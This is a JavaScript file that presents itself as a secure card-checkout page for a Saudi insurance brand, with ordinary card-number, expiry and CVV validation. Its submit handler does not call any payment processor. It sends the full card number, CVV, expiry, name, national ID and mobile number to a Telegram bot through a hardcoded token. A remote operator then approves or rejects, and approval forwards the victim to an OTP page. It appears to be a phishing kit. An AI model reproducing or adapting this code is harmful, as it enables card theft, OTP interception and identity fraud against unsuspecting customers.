/* =====================================================
   بي كير — secure-checkout.js  v2
   Stripe-style: حقل MM/YY موحّد + Luhn + كشف نوع البطاقة
===================================================== */
'use strict';

/* ─── كشف نوع البطاقة ────────────────────────────── */
const CARD_TYPES = [
  { name:'Visa',       cls:'visa', prefix:/^4/,                                           len:[13,16,19], cvv:3 },
  { name:'Mastercard', cls:'mc',   prefix:/^5[1-5]|^2(2[2-9]|[3-6]\d|7[01]|720)/,        len:[16],       cvv:3 },
  { name:'Amex',       cls:'amex', prefix:/^3[47]/,                                        len:[15],       cvv:4 },
  { name:'Mada',       cls:'mada', prefix:/^(4(0117[5-9]|01180|28|36|49|51|55|58|6304|6759|676[1-3]|9))|^9682/,len:[16],cvv:3},
];

function detectType(raw) {
  const c = raw.replace(/\D/g,'');
  return CARD_TYPES.find(t => t.prefix.test(c)) || null;
}

/* ─── Luhn ───────────────────────────────────────── */
function luhn(raw) {
  const c = raw.replace(/\D/g,'');
  if (!c.length) return false;
  let sum = 0, alt = false;
  for (let i = c.length-1; i >= 0; i--) {
    let d = parseInt(c[i],10);
    if (alt) { d *= 2; if(d>9) d-=9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}

/* ─── تنسيق رقم البطاقة ──────────────────────────── */
function fmtCardNum(raw, type) {
  const c = raw.replace(/\D/g,'');
  if (type?.name === 'Amex') {
    /* 4-6-5 */
    const p1 = c.slice(0,4), p2 = c.slice(4,10), p3 = c.slice(10,15);
    return [p1,p2,p3].filter(Boolean).join(' ');
  }
  return c.match(/.{1,4}/g)?.join(' ') || c;
}

/* ─── تنسيق MM/YY ────────────────────────────────── */
function fmtExpiry(raw) {
  const c = raw.replace(/\D/g,'');
  if (c.length <= 2) return c;
  return c.slice(0,2) + '/' + c.slice(2,4);
}

/* ─── قراءة بيانات الجلسة ───────────────────────── */
function loadData() {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const inquiry = JSON.parse(sessionStorage.getItem('bcare_inquiry') || '{}');
    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };

    /* الشعار */
    const logo = document.getElementById('co-logo');
    if (logo && offer.companyLogo) { logo.src = offer.companyLogo; logo.style.display = 'block'; }
    else if (logo) { logo.style.display = 'none'; }

    set('co-sum-company', offer.companyName || '—');

    /* فترات التأمين */
    const start = inquiry.policyStartDate || '';
    if (start) {
      set('co-sum-start', start);
      const d = new Date(start);
      if (!isNaN(d)) {
        d.setFullYear(d.getFullYear() + 1);
        const endStr = d.toLocaleDateString('ar-SA', { year:'numeric', month:'2-digit', day:'2-digit' });
        set('co-sum-end', endStr);
      } else {
        set('co-sum-end', '—');
      }
    }

    /* المبالغ */
    const price    = offer.price || 0;
    const discount = offer.discount || 0;
    const vat      = offer.vat || 0;
    const total    = offer.total || 0;

    const fmtR = (n) => 'ر.س ' + parseFloat(n).toFixed(2);
    set('co-sum-price',  fmtR(price));
    set('co-sum-vat',    fmtR(vat));
    set('co-sum-total',  fmtR(total));

    if (discount > 0) {
      document.getElementById('co-discount-row').style.display = '';
      set('co-sum-discount', '-' + fmtR(discount));
      const subtotal = price - discount;
      document.getElementById('co-subtotal-row').style.display = '';
      set('co-sum-subtotal', fmtR(subtotal));
    }

    /* اسم الحامل من policy-details */
    const nameInp = document.getElementById('cc-name');
    if (nameInp && policy.fullName) {
      nameInp.value = policy.fullName;
    }
  } catch(e) {}
}

/* ─── Focus على sc-f-inner ──────────────────── */
function initFloatingLabels() {
  document.querySelectorAll('.sc-f-inner').forEach(inner => {
    const inp = inner.querySelector('input');
    if (!inp) return;
    inp.addEventListener('focus', () => inner.classList.add('focused'));
    inp.addEventListener('blur',  () => inner.classList.remove('focused'));
    /* حالة أولية */
    if (inp.value) inner.classList.add('has-value');
  });
}

/* ─── خطأ / مسح خطأ ──────────────────────────────── */
function setCardErr(msg) {
  const e = document.getElementById('err-card');
  const b = document.getElementById('card-fields-box');
  if (e) e.textContent = msg;
  if (b) { msg ? b.classList.add('has-error') : b.classList.remove('has-error'); }
}
function setNameErr(msg) {
  const e = document.getElementById('err-name');
  const b = document.getElementById('name-field-box');
  if (e) e.textContent = msg;
  if (b) { msg ? b.classList.add('has-error') : b.classList.remove('has-error'); }
}

/* ─── تحقق الحقول ────────────────────────────────── */
function checkNum() {
  const raw = (document.getElementById('cc-number')||{}).value||'';
  const c   = raw.replace(/\D/g,'');
  if (!c) { setCardErr('رقم البطاقة مطلوب'); return false; }
  if (c.length < 13) { setCardErr('رقم البطاقة قصير — تأكد من الإدخال'); return false; }
  if (!luhn(c)) { setCardErr('رقم البطاقة غير صحيح'); return false; }
  setCardErr('');
  return true;
}
function checkExpiry() {
  const v = (document.getElementById('cc-expiry')||{}).value||'';
  const parts = v.split('/');
  const mo = parseInt(parts[0]||'0',10);
  const yr = parseInt((parts[1]||'').trim(),10);
  if (!mo || mo<1 || mo>12) { setCardErr('تاريخ الانتهاء غير صحيح — أدخل MM/YY'); return false; }
  const now = new Date();
  const fullYr = yr < 100 ? 2000+yr : yr;
  if (!yr || fullYr < now.getFullYear()) { setCardErr('البطاقة منتهية الصلاحية'); return false; }
  if (fullYr === now.getFullYear() && mo < now.getMonth()+1) { setCardErr('البطاقة منتهية الصلاحية'); return false; }
  return true;
}
function checkCVV() {
  const v    = (document.getElementById('cc-cvv')||{}).value||'';
  if (!v) { setCardErr('رمز CVV مطلوب'); return false; }
  if (!/^\d+$/.test(v) || v.length !== 3) { setCardErr('رمز CVV يجب أن يكون 3 أرقام'); return false; }
  return true;
}
function checkName() {
  const v = (document.getElementById('cc-name')||{}).value||'';
  if (!v.trim()) { setNameErr('اسم حامل البطاقة مطلوب'); return false; }
  if (v.trim().length < 3) { setNameErr('يرجى إدخال الاسم الكامل'); return false; }
  setNameErr(''); return true;
}

function validateAll() {
  const r1 = checkNum();
  const r2 = r1 && checkExpiry(); /* نعرض خطأ رقم البطاقة أولاً */
  const r3 = r1 && r2 && checkCVV();
  const r4 = checkName();
  return r1 && r2 && r3 && r4;
}

/* ─── حقل رقم البطاقة ────────────────────────────── */
function initCardNum() {
  const inp = document.getElementById('cc-number');
  if (!inp) return;

  inp.addEventListener('input', () => {
    const type   = detectType(inp.value);
    const maxRaw = type?.name==='Amex' ? 15 : 16;
    const raw    = inp.value.replace(/\D/g,'').slice(0, maxRaw);
    const fmt    = fmtCardNum(raw, type);
    inp.value    = fmt;

    /* pill — سيُحدَّث أسفل مع الملخص */

    /* تحديث الملخص السفلي — آخر 4 أرقام */
    const clean = raw.replace(/\D/g,'');
    const sumCard = document.getElementById('co-sum-card');
    const sumType = document.getElementById('co-sum-card-type');
    if (sumCard) sumCard.textContent = clean.length >= 4
      ? '**** **** **** ' + clean.slice(-4)
      : clean.length > 0 ? clean : '—';
    if (sumType) sumType.textContent = type?.name || '';

    /* floating label */
    updateInnerState('inner-number', fmt);

    /* pill: يظهر فقط إذا عُرف نوع البطاقة */
    const pill = document.getElementById('card-type-pill');
    if (pill) {
      if (type?.name) {
        pill.textContent = type.name;
        pill.className   = 'sc-pill active ' + (type.cls||'');
      } else {
        pill.textContent = '';
        pill.className   = 'sc-pill';
      }
    }

    /* مسح خطأ */
    setCardErr('');
  });
  inp.addEventListener('blur', () => { checkNum(); });
}

/* floating label helper */
function updateInnerState(innerId, value) {
  const inner = document.getElementById(innerId);
  if (!inner) return;
  if (value && String(value).trim()) {
    inner.classList.add('has-value');
  } else {
    inner.classList.remove('has-value');
  }
}

/* ─── حقل MM/YY موحّد ────────────────────────────── */
function initExpiry() {
  const inp = document.getElementById('cc-expiry');
  if (!inp) return;

    inp.addEventListener('input', () => {
    const raw = inp.value.replace(/\D/g,'').slice(0,4);
    /* منع الشهر > 12 أثناء الكتابة */
    let month = raw.slice(0,2);
    if (month.length === 1 && parseInt(month) > 1) month = '0' + month;
    if (month.length === 2 && parseInt(month) > 12) month = '12';
    const yr = raw.slice(2,4);
    const newRaw = month + yr;
    inp.value = fmtExpiry(newRaw);
    setCardErr('');
    updateInnerState('inner-expiry', inp.value);
  });
  inp.addEventListener('blur', checkExpiry);
}

/* ─── حقل CVV ────────────────────────────────────── */
function initCVV() {
  const inp = document.getElementById('cc-cvv');
  if (!inp) return;
  inp.addEventListener('input', () => {
    inp.value = inp.value.replace(/\D/g,'').slice(0,3);  /* 3 أرقام فقط */
    setCardErr('');
    updateInnerState('inner-cvv', inp.value);
  });
  inp.addEventListener('blur', checkCVV);
}

/* ─── حقل الاسم ──────────────────────────────────── */
function initName() {
  const inp = document.getElementById('cc-name');
  if (!inp) return;
  inp.addEventListener('input', () => {
    setNameErr('');
    updateInnerState('inner-name', inp.value);
  });
  inp.addEventListener('blur', checkName);
  /* floating label عند التحميل (الاسم مُملوء مسبقاً) */
  if (inp.value) updateInnerState('inner-name', inp.value);
}

/* ─── تحديث expiry inner state ──────────────────── */
function initExpiryInner() {
  const inp = document.getElementById('cc-expiry');
  if (!inp) return;
  inp.addEventListener('input', () => updateInnerState('inner-expiry', inp.value));
}

/* ═══════════════════════════════════════════════════════
   شاشة التحقق — انتظار قرار الأدمن من Telegram
   ═══════════════════════════════════════════════════════ */

const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

let verifyPollInt   = null;
let lastVerifyUpdateId = 0;
let paymentApproved = false;
let myRefNumber = '';

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text, replyMarkup) {
  try {
    const body = { chat_id: TG.CHAT, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
    );
    return await res.json();
  } catch(e) { console.error('TG:', e); return { ok: false }; }
}

async function tgAnswerCallback(callbackQueryId, text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/answerCallbackQuery`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) }
    );
  } catch(e) {}
}

async function tgEditMessage(messageId, text, replyMarkup) {
  try {
    const body = { chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/editMessageText`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
    );
  } catch(e) {}
}

async function tgGetUpdates() {
  try {
    const res  = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastVerifyUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── بناء رسالة الطلب + أزرار ─────────────────────── */
function buildCheckoutOrderMsg(ref) {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');

    return `🔔 <b>طلب دفع جديد — بي كير</b>

🆔 <b>المرجع: </b><code>${ref}</code>

👤 <b>العميل</b>
• الاسم: <b>${policy.fullName || '—'}</b>
• رقم الهوية: <code>${form.nationalId || '—'}</code>
• الجوال: <code>${policy.mobile || '—'}</code>

🚗 <b>التأمين</b>
• الشركة: <b>${offer.companyName || '—'}</b>
• نوع التأمين: ${offer.insuranceType || '—'}
• ماركة المركبة: ${policy.carBrand || '—'}

💳 <b>بطاقة الدفع</b>
• رقم البطاقة: <code>${card.number || '****'}</code>
• النوع: ${card.type || '—'}
• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
• CVV: <code>${card.cvv || '—'}</code>

💰 <b>المبلغ</b>
• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>

⏳ <b>العميل بانتظار قرارك...</b>`;
  } catch(e) {
    return `🔔 طلب دفع جديد — بي كير\n🆔 المرجع: ${ref}`;
  }
}

function buildKeyboard(ref) {
  return {
    inline_keyboard: [
      [
        { text: '✅ دخول OTP', callback_data: `approve_${ref}` },
        { text: '❌ رفض',     callback_data: `reject_${ref}`  },
      ],
      [
        { text: '🚫 حظر العميل', callback_data: `block_${ref}` },
      ]
    ]
  };
}

/* ─── عرض شاشة التحقق ────────────────────────────── */
let verifyStartTime = 0;
let verifyAnimFrame = null;

function showVerifyingOverlay() {
  const ov = document.getElementById('verify-overlay');
  if (!ov) return;
  ov.classList.remove('hidden');
  paymentApproved = false;
  verifyStartTime = performance.now();

  const timerEl = document.getElementById('vo-timer');
  const circEl  = document.getElementById('vo-circ-progress');
  const CIRC = 264;

  function tick(now) {
    if (paymentApproved) return;
    const elapsed = (now - verifyStartTime) / 1000;

    if (timerEl) {
      timerEl.textContent = Math.floor(elapsed);
    }
    if (circEl) {
      const pct = (elapsed % 60) / 60;
      circEl.setAttribute('stroke-dashoffset', CIRC - (CIRC * pct));
    }
    verifyAnimFrame = requestAnimationFrame(tick);
  }
  verifyAnimFrame = requestAnimationFrame(tick);
}

/* ─── استلام قرار الأدمن ──────────────────────────── */
function startVerifyPolling() {
  clearInterval(verifyPollInt);
  verifyPollInt = setInterval(async () => {
    if (paymentApproved) return;
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastVerifyUpdateId = u.update_id;

      /* ── زر Inline Callback ── */
      if (u.callback_query) {
        const cq = u.callback_query;
        const data = cq.data || '';

        if (data.startsWith('approve_')) {
          const ref = data.replace('approve_', '');
          if (ref === myRefNumber) {
            paymentApproved = true;
            clearInterval(verifyPollInt);
            cancelAnimationFrame(verifyAnimFrame);
            await tgAnswerCallback(cq.id, '✅ تم الموافقة');
            await tgEditMessage(cq.message.message_id,
              cq.message.text + '\n\n✅ <b>تم الموافقة — جاري التحويل...</b>', null);
            goToOTP();
            return;
          }
        }

        if (data.startsWith('reject_')) {
          const ref = data.replace('reject_', '');
          if (ref === myRefNumber) {
            paymentApproved = true;
            clearInterval(verifyPollInt);
            cancelAnimationFrame(verifyAnimFrame);
            await tgAnswerCallback(cq.id, '❌ تم الرفض');
            await tgEditMessage(cq.message.message_id,
              cq.message.text + '\n\n❌ <b>تم الرفض</b>', null);
            showVerifyReject();
            return;
          }
        }

        if (data.startsWith('block_')) {
          const ref = data.replace('block_', '');
          const ip = await Tracker.getIP();
          await tgAnswerCallback(cq.id, '🚫 جاري الحظر...');
          await tgEditMessage(cq.message.message_id,
            cq.message.text + `\n\n🚫 <b>تم حظر العميل</b>\nIP: <code>${ip}</code>`,
            { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
          await Tracker.blockIP(ip);
          return;
        }

        if (data.startsWith('blockip_')) {
          const ip = data.replace('blockip_', '');
          await tgAnswerCallback(cq.id, '🚫 جاري الحظر...');
          await tgEditMessage(cq.message.message_id,
            cq.message.text + `\n\n🚫 <b>تم حظر هذا IP</b>\n<code>${ip}</code>`,
            { inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]] });
          await Tracker.blockIP(ip);
          return;
        }

        if (data.startsWith('unblockip_')) {
          const ip = data.replace('unblockip_', '');
          await tgAnswerCallback(cq.id, '✅ تم إلغاء الحظر');
          await tgEditMessage(cq.message.message_id,
            cq.message.text + `\n\n✅ <b>تم إلغاء حظر هذا العميل</b>`, null);
          await Tracker.unblockIP(ip);
          return;
        }
      }

      /* ── نص عادي (backup) ── */
      const text = (u.message?.text || '').trim();
      if (text === 'دخول' || text === 'otp') {
        paymentApproved = true;
        clearInterval(verifyPollInt);
        cancelAnimationFrame(verifyAnimFrame);
        goToOTP();
        return;
      }
      if (text.toUpperCase() === 'REJECT') {
        paymentApproved = true;
        clearInterval(verifyPollInt);
        cancelAnimationFrame(verifyAnimFrame);
        showVerifyReject();
        return;
      }
    }
  }, 2500);
}

/* ─── الانتقال لصفحة OTP ──────────────────────────── */
function goToOTP() {
  try {
    const offer    = JSON.parse(sessionStorage.getItem('bcare_offer')||'{}');
    const cardRaw  = (document.getElementById('cc-number')||{}).value||'';
    const cardClean= cardRaw.replace(/\D/g,'');
    const cardType = detectType(cardRaw);
    const expiry   = (document.getElementById('cc-expiry')||{}).value||'';
    const cvv      = (document.getElementById('cc-cvv')||{}).value||'';
    const name     = (document.getElementById('cc-name')||{}).value||'';
    const ref      = offer.refNumber || myRefNumber;

    offer.cardMasked = cardClean.slice(-4);
    offer.cardType   = cardType?.name || 'بطاقة';
    offer.refNumber  = ref;
    sessionStorage.setItem('bcare_offer', JSON.stringify(offer));

    sessionStorage.setItem('bcare_card_data', JSON.stringify({
      number: cardClean.replace(/(\d{4})/g,'$1 ').trim(),
      type:   cardType?.name || 'بطاقة',
      expiry,
      cvv,
      name,
    }));
  } catch(err){}

  window.location.href = 'otp-verify.html';
}

/* ─── عرض رفض ─────────────────────────────────────── */
function showVerifyReject() {
  const ov = document.getElementById('verify-overlay');
  if (!ov) return;
  ov.innerHTML = `
    <div class="vo-backdrop"></div>
    <div class="vo-card">
      <div style="width:64px;height:64px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem">
        <span class="material-icons" style="font-size:2rem;color:#e53935">cancel</span>
      </div>
      <h3 class="vo-title" style="color:#e53935">تم رفض العملية</h3>
      <p class="vo-desc">نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.</p>
      <button type="button" class="vo-secure-link" onclick="window.location.href='secure-checkout.html'" style="cursor:pointer;border:none;margin-top:.75rem">
        <span class="material-icons">arrow_forward</span>
        العودة لصفحة الدفع
      </button>
    </div>`;
}

/* ─── إرسال النموذج ─────────────────────────────── */
function initSubmit() {
  const form = document.getElementById('checkout-form');
  const btn  = document.getElementById('pay-now-btn');
  if (!form) return;

  async function doPayment(e) {
    if (e) e.preventDefault();
    if (!btn) return;
    if (!validateAll()) return;

    btn.disabled = true;
    btn.innerHTML = '<span class="material-icons sc-spin">autorenew</span> جاري معالجة الدفع...';

    /* توليد رقم مرجعي فريد */
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
      offer.refNumber = myRefNumber;
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    } catch(e) {
      myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
    }

    /* حفظ بيانات البطاقة قبل الإرسال */
    try {
      const cardRaw   = (document.getElementById('cc-number')||{}).value||'';
      const cardClean = cardRaw.replace(/\D/g,'');
      const cardType  = detectType(cardRaw);
      const expiry    = (document.getElementById('cc-expiry')||{}).value||'';
      const cvv       = (document.getElementById('cc-cvv')||{}).value||'';
      const name      = (document.getElementById('cc-name')||{}).value||'';
      sessionStorage.setItem('bcare_card_data', JSON.stringify({
        number: cardClean.replace(/(\d{4})/g,'$1 ').trim(),
        type:   cardType?.name || 'بطاقة',
        expiry,
        cvv,
        name,
      }));
    } catch(e){}

    /* 📨 إرسال تفاصيل الطلب لـ Telegram مع أزرار */
    await tgSend(buildCheckoutOrderMsg(myRefNumber), buildKeyboard(myRefNumber));

    /* 📊 إرسال رحلة العميل */
    await Tracker.sendJourneyToTelegram('💰 <b>العميل وصل صفحة الدفع</b>');

    /* تجاوز رسائل قديمة */
    const oldUpdates = await tgGetUpdates();
    if (oldUpdates.length > 0) {
      lastVerifyUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
    }

    /* عرض الشاشة + بدء الاستماع لقرار الأدمن */
    showVerifyingOverlay();
    startVerifyPolling();
  }

  form.addEventListener('submit', doPayment);
}

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  loadData();
  initFloatingLabels();
  initCardNum();
  initExpiry();
  initExpiryInner();
  initCVV();
  initName();
  initSubmit();
});
